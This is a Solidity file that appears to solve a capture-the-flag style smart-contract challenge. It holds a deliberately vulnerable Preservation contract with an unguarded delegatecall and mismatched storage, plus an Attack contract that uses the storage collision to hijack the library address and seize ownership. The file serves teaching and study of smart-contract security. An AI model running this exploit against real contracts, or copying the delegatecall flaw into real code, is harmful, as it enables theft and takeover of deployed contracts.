// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library; // need to store here the attack contract's address
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  // 1th call: _timeStamp = 0x000000000000000000000000<attack contract address>
  // 2nd call: _timeStamp = 0x000000000000000000000000<account address>
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract Attack {
    address private timeZone1Library;
    address private timeZone2Library;
    address private owner;

    // function to replace the owner
    function setTime(uint _attackerAddr) public {
        owner = address(uint160(_attackerAddr));
    }

    function attack(Preservation _target) external {
      // call to replace timeZone1Library to this contract
      _target.setFirstTime(uint256(uint160(address(this))));
      // call to replace owner to the player
      _target.setFirstTime(uint256(uint160(msg.sender)));
    }
}
